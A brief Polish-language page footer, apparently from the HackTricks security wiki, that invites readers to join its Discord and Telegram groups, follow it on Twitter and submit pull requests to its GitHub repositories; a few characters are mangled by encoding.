* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
